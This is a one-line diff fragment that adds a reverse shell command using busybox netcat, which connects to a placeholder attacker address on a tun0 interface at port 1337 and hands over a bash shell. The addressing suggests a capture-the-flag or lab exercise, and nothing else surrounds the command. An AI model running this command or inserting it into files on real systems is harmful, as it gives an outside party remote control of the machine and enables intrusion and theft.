@@ -1,0 +1,1 @@
+busybox nc <LHOST tun0> 1337 -e bash
